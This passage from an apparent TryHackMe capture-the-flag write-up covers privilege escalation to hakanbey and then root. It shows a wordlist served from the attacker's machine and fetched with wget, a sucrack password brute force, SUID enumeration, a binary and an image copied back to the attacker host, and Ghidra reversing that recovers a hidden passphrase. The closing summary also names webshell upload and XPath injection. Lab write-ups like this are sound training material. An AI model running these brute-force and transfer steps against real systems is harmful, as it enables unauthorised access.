┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|10:05:51(HKT)]
└> python3 modify_wordlist.py
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|10:06:04(HKT)]
└> head -n 5 modified_wordlist.txt 
123adana123456
123adana12345
123adana123456789
123adanapassword
123adanailoveyou
```

**Finally, we can transfer the modified wordlist to the target machine, and brute force user `hakanbey` via `sucrack`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|10:06:36(HKT)]
└> python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
hakanftp@ubuntu:/tmp/sucrack$ wget http://10.9.0.253:8000/modified_wordlist.txt -O /tmp/modified_wordlist.txt
hakanftp@ubuntu:/tmp/sucrack$ /tmp/sucrack/src/sucrack -w 100 -u hakanbey /tmp/modified_wordlist.txt
[...]
36838/803886
password is: 123adana{Redacted}
```

> Note: The worker number is recommended to set to 100, otherwise it would be painfully slow to brute force.

We successfully brute forced user `hakanbey`'s password!!

**Let's Switch User to that user:**
```shell
hakanftp@ubuntu:/tmp/sucrack$ su hakanbey
Password: 
hakanbey@ubuntu:/var/www/subdomain$ whoami;hostname;id;ip a
hakanbey
ubuntu
uid=1000(hakanbey) gid=1000(hakanbey) groups=1000(hakanbey),4(adm),24(cdrom),30(dip),46(plugdev),108(lxd)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:e0:8b:fe:8b:6d brd ff:ff:ff:ff:ff:ff
    inet 10.10.152.107/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::e0:8bff:fefe:8b6d/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm user `hakanbey`!!

**user.txt:**
```shell
hakanbey@ubuntu:/var/www/subdomain$ cat /home/hakanbey/user.txt 
THM{Redacted}
```

### hakanbey to root

Now, I wonder why we couldn't enumerate SUID binaries via `find` in `www-data` user.

**Let's check `find` file permission:**
```shell
hakanbey@ubuntu:/var/www/subdomain$ which find
/usr/bin/find
hakanbey@ubuntu:/var/www/subdomain$ ls -lah /usr/bin/find
-rwxr-x--- 1 root hakanbey 233K Nov  5  2017 /usr/bin/find
```

As you can see, the `find` binary doesn't have a world-executable bit! That's why we couldn't use `find`!

**Now, we can use `find` binary, as group `hakanbey` has executable permission!**
```shell
hakanbey@ubuntu:/var/www/subdomain$ find / -perm -4000 2>/dev/null
[...]
/usr/bin/binary
[...]
```

The `/usr/bin/binary` looks sussy...

**Let's check that out:**
```shell
hakanbey@ubuntu:/var/www/subdomain$ ls -lah /usr/bin/binary 
-r-srwx--- 1 root hakanbey 13K Jan 14  2021 /usr/bin/binary
hakanbey@ubuntu:/var/www/subdomain$ file /usr/bin/binary 
/usr/bin/binary: setuid ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=1a7536564f948801838b782a3dd088cc41bd294d, not stripped
hakanbey@ubuntu:/var/www/subdomain$ strings /usr/bin/binary 
[...]
I think you should enter the correct string here ==>
/root/hint.txt
Hint! : %s
/root/root.jpg
Unable to open source!
/home/hakanbey/root.jpg
Copy /root/root.jpg ==> /home/hakanbey/root.jpg
Unable to copy!
[...]
```

Hmm... It seems like it's copying a file to another location?

```
hakanbey@ubuntu:/var/www/subdomain$ /usr/bin/binary
I think you should enter the correct string here ==>test
pkill: killing pid 22538 failed: Operation not permitted
pkill: killing pid 22543 failed: Operation not permitted
```

When we entered an incorrect string, it'll kill our `su`'s process.

**Now, we can transfer that binary and use Ghidra to reverse engineering it:**
```shell
hakanbey@ubuntu:/var/www/subdomain$ cd /usr/bin
hakanbey@ubuntu:/usr/bin$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|10:37:43(HKT)]
└> wget http://$RHOSTS:8000/binary
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|10:49:10(HKT)]
└> ghidra
```

**Function `main()`:**
```c
undefined8 main(void)

{
  int iVar1;
  FILE *__stream;
  FILE *__stream_00;
  FILE *__stream_01;
  long in_FS_OFFSET;
  undefined8 local_1e8;
  undefined8 local_1e0;
  undefined8 local_1d8;
  undefined8 local_1d0;
  undefined8 local_1c8;
  undefined8 local_1c0;
  undefined8 local_1b8;
  undefined8 local_1b0;
  undefined8 local_1a8;
  undefined8 local_1a0;
  undefined4 local_198 [4];
  undefined2 local_188 [8];
  undefined2 local_178 [8];
  undefined4 local_168 [4];
  undefined4 local_158 [4];
  undefined4 local_148;
  undefined local_144;
  char local_138 [32];
  undefined2 local_118;
  undefined local_116;
  long local_10;
  
  local_10 = *(long *)(in_FS_OFFSET + 0x28);
  local_1e8 = 0x726177;
  local_1e0 = 0;
  local_1d8 = 0x656e6f7a;
  local_1d0 = 0;
  local_1c8 = 0x6e69;
  local_1c0 = 0;
  local_1b8 = 0x616461;
  local_1b0 = 0;
  local_1a8 = 0x616e;
  local_1a0 = 0;
  strcat((char *)&local_1e8,(char *)&local_1d8);
  strcat((char *)&local_1e8,(char *)&local_1c8);
  strcat((char *)&local_1e8,(char *)&local_1b8);
  strcat((char *)&local_1e8,(char *)&local_1a8);
  printf("I think you should enter the correct string here ==>");
  __isoc99_scanf(&DAT_00100edd,local_138);
  iVar1 = strcmp(local_138,(char *)&local_1e8);
  if (iVar1 == 0) {
    __stream = fopen("/root/hint.txt","r");
    __isoc99_fscanf(__stream,&DAT_00100edd,&local_118);
    printf("Hint! : %s",&local_118);
    fgets((char *)&local_118,0xff,__stream);
    puts((char *)&local_118);
    __stream_00 = fopen("/root/root.jpg","rb");
    if (__stream_00 == (FILE *)0x0) {
      puts("Unable to open source!");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __stream_01 = fopen("/home/hakanbey/root.jpg","wb");
    puts("Copy /root/root.jpg ==> /home/hakanbey/root.jpg");
    if (__stream_01 == (FILE *)0x0) {
      puts("Unable to copy!");
      fclose(__stream_00);
                    /* WARNING: Subroutine does not return */
      exit(2);
    }
    while( true ) {
      iVar1 = fgetc(__stream_00);
      if (iVar1 == -1) break;
      fputc(iVar1,__stream_01);
    }
    fclose(__stream);
    fclose(__stream_00);
    fclose(__stream_01);
  }
  else {
    local_198[0] = 0x696b70;
    local_188[0] = 0x6c;
    local_178[0] = 0x6c;
    local_168[0] = 0x392d20;
    local_158[0] = 0x742d20;
    local_148 = 0x73747020;
    local_144 = 0;
    local_118 = 0x302f;
    local_116 = 0;
    strcat((char *)local_198,(char *)local_188);
    strcat((char *)local_198,(char *)local_178);
    strcat((char *)local_198,(char *)local_168);
    strcat((char *)local_198,(char *)local_158);
    strcat((char *)local_198,(char *)&local_148);
    strcat((char *)local_198,(char *)&local_118);
    system((char *)local_198);
  }
  if (local_10 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

**The `local_1a-d8` looks interesting:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|10:49:30(HKT)]
└> echo '0x726177' | xxd -r -p                         
raw
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|10:52:12(HKT)]
└> echo '0x656e6f7a' | xxd -r -p
enoz
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|10:52:35(HKT)]
└> echo '0x6e69' | xxd -r -p    
ni
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|10:52:47(HKT)]
└> echo '0x616461' | xxd -r -p
ada
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)[2023.02.02|10:52:54(HKT)]
└> echo '0x616e' | xxd -r -p  
an
```

`rawenozniadaan`? `zoneniadaanraw`??

**Umm... Let's reverse it:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|11:03:18(HKT)]
└> echo '0x616e0x6164610x6e690x656e6f7a0x726177' | xxd -r -p | rev
warzoneinadana
```

`warzoneinadana` may be correct?

**Let's try that:**
```shell
hakanbey@ubuntu:/usr/bin$ /usr/bin/binary
I think you should enter the correct string here ==>warzoneinadana
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)

Copy /root/root.jpg ==> /home/hakanbey/root.jpg
hakanbey@ubuntu:/usr/bin$ ls -lah /home/hakanbey/root.jpg 
-rw-rw-r-- 1 root hakanbey 45K Feb  2 03:04 /home/hakanbey/root.jpg
```

Nice!

**Now, the `binary` copied a `jpg` image, and outputs a hint:**
```
Hint! : Hexeditor 00000020 ==> ???? ==> /home/hakanbey/Desktop/root.jpg (CyberChef)
```

**Armed with above information, we can first transfer the `root.jpg` image:**
```shell
hakanbey@ubuntu:/usr/bin$ cd ~
hakanbey@ubuntu:~$ python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
```

```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|11:03:22(HKT)]
└> wget http://$RHOSTS:8000/root.jpg
```

**Then, use `xxd` and check offset `00000020`:**
```shell
┌[siunam♥earth]-(~/ctf/thm/ctf/Different-CTF)-[2023.02.02|11:12:01(HKT)]
└> xxd root.jpg | head -n 3
00000000: ffd8 ffe0 0010 4a46 4946 0001 0101 0060  ......JFIF.....`
00000010: 0060 0000 ffe1 0078 4578 6966 0000 4d4d  .`.....xExif..MM
00000020: fee9 9d3d {Redacted}                     ...=y._..m..i..u
```

**After that, copy offset `00000020`'s value, paste it to [CyberChef](https://gchq.github.io/CyberChef/):**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230202111448.png)

**In the room's hint, we see:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230202111510.png)

**Let's use those recipes:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/TryHackMe/Different-CTF/images/Pasted%20image%2020230202111539.png)

We found root's password!

**Let's Switch User to root!**
```shell
hakanbey@ubuntu:~$ su root
Password: 
root@ubuntu:/home/hakanbey# whoami;hostname;id;ip a
root
ubuntu
uid=0(root) gid=0(root) groups=0(root)
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:e0:8b:fe:8b:6d brd ff:ff:ff:ff:ff:ff
    inet 10.10.152.107/16 brd 10.10.255.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::e0:8bff:fefe:8b6d/64 scope link 
       valid_lft forever preferred_lft forever
```

I'm root! :D

## Rooted

**root.txt:**
```shell
root@ubuntu:/home/hakanbey# cat /root/root.txt
THM{Redacted}
```

# Conclusion

What we've learned:

1. Enumerating SMB
2. Enumerating Hidden Directories and Files via `gobuster`
3. Exploiting XPath Injection In Login Page
4. Uploading PHP Webshell Via SMB
5. Port Forwarding
6. Password Spraying
7. Vertical Privilege Escalation Via `vim`
8. Horizontal Privilege Escalation Via Hijacking Tmux Session